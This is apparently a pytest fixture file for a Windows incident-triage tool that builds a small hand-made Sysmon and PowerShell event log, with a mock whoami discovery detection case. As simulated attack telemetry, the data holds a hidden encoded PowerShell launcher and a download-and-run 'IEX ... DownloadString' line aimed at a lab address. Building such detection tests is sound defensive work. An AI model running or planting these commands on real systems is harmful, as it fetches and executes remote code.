"""A tiny hand-made recording so the tests need no downloaded data."""

from __future__ import annotations

import pytest

from triage.corpus import SYSMON, attach_powershell_processes, collect_processes, create_store, insert_capture, normalize_capture
from triage.store import CaseStore

SYS = "Microsoft-Windows-Sysmon/Operational"
G_SERVICES, G_AGENT, G_WHOAMI, G_SVCHOST = (
    "{aaaaaaaa-0000-0000-0000-000000000001}",
    "{aaaaaaaa-0000-0000-0000-000000000002}",
    "{aaaaaaaa-0000-0000-0000-000000000003}",
    "{aaaaaaaa-0000-0000-0000-000000000004}",
)


def raw_events() -> list[dict]:
    def sysmon(eid: int, time: str, **fields: str) -> dict:
        return {
            "Channel": SYS,
            "EventID": eid,
            "Hostname": "WS1.lab.local",
            "UtcTime": f"2024-01-01 {time}",
            "EventTime": f"2023-12-31 {time[:8]}",
            **fields,
        }

    return [
        sysmon(
            1,
            "10:00:00.000",
            ProcessGuid=G_AGENT,
            ProcessId="4321",
            Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            CommandLine="powershell.exe -noP -sta -w 1 -enc SQBFAFgA",
            User="LAB\\alice",
            IntegrityLevel="High",
            ParentProcessGuid=G_SERVICES,
            ParentProcessId="700",
            ParentImage="C:\\Windows\\System32\\services.exe",
            ParentCommandLine="C:\\Windows\\system32\\services.exe",
            Company="Microsoft Corporation",
        ),
        sysmon(
            3,
            "10:00:01.000",
            ProcessGuid=G_AGENT,
            ProcessId="4321",
            Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            DestinationIp="10.10.10.5",
            DestinationPort="80",
            SourceIp="10.0.0.4",
            User="LAB\\alice",
        ),
        sysmon(
            1,
            "10:00:02.000",
            ProcessGuid=G_WHOAMI,
            ProcessId="5000",
            Image="C:\\Windows\\System32\\whoami.exe",
            CommandLine="whoami /user",
            User="LAB\\alice",
            IntegrityLevel="High",
            ParentProcessGuid=G_AGENT,
            ParentProcessId="4321",
            ParentImage="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            ParentCommandLine="powershell.exe -noP -sta -w 1 -enc SQBFAFgA",
        ),
        sysmon(
            13,
            "10:00:03.000",
            ProcessGuid=G_SVCHOST,
            ProcessId="900",
            Image="C:\\Windows\\System32\\svchost.exe",
            TargetObject="HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\Microsoft\\Windows\\Defrag\\Index",
            Details="DWORD (0x00000003)",
            User="NT AUTHORITY\\SYSTEM",
        ),
        {
            "Channel": "Microsoft-Windows-PowerShell/Operational",
            "EventID": 4104,
            "Hostname": "WS1.lab.local",
            "EventTime": "2023-12-31 10:00:01",
            "ExecutionProcessID": "4321",
            "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.5/a')",
        },
        {
            "Channel": "Security",
            "EventID": 4624,
            "Hostname": "WS1.lab.local",
            "EventTime": "2023-12-31 09:59:50",
            "TargetUserName": "alice",
            "LogonType": "3",
            "IpAddress": "10.0.0.9",
        },
    ]


@pytest.fixture()
def recording(tmp_path):
    events = normalize_capture(raw_events())
    for offset, event in enumerate(events):
        event["id"] = 100 + offset
    processes = collect_processes(events)
    attach_powershell_processes(events, processes)
    connection = create_store(tmp_path / "events.sqlite")
    connection.execute("CREATE TABLE seen (kind TEXT, value TEXT, capture TEXT, day TEXT, PRIMARY KEY (kind, value, capture, day))")
    connection.executemany(
        "INSERT INTO seen VALUES (?,?,?,?)",
        [
            ("name", "whoami.exe", "other-1", "2024-01-02"),
            ("name", "whoami.exe", "other-2", "2024-01-03"),
            ("pair", "powershell.exe>whoami.exe", "other-1", "2024-01-02"),
            ("name", "svchost.exe", "tiny", "2024-01-01"),
        ],
    )
    insert_capture(connection, "tiny", events, processes)
    return {"events": events, "processes": processes, "store": CaseStore("tiny", connection), "connection": connection}


@pytest.fixture()
def case(recording):
    whoami = next(e for e in recording["events"] if e["channel"] == SYSMON and e["fields"].get("ProcessGuid") == G_WHOAMI)
    return {
        "case_id": "C9001",
        "host": "ws1",
        "pguid": G_WHOAMI,
        "first_alert_ts": whoami["ts"],
        "max_level": "low",
        "subject": {
            "image": "C:\\Windows\\System32\\whoami.exe",
            "command_line": "whoami /user",
            "user": "LAB\\alice",
            "pid": "5000",
            "integrity": "High",
            "started": whoami["ts"],
            "parent_image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "parent_command_line": "powershell.exe -noP -sta -w 1 -enc SQBFAFgA",
        },
        "detections": [
            {
                "rule_id": "r1",
                "title": "Local Accounts Discovery",
                "level": "low",
                "description": "Local accounts discovery.",
                "techniques": ["T1033"],
                "tactics": ["discovery"],
                "known_false_positives": ["Admin activity"],
                "author": "someone",
                "source": "rules/x.yml",
                "event_ids": [whoami["id"]],
                "hits": 1,
            }
        ],
        "triggers": [{"event_id": whoami["id"], "ts": whoami["ts"], "what": "process created: whoami /user"}],
    }
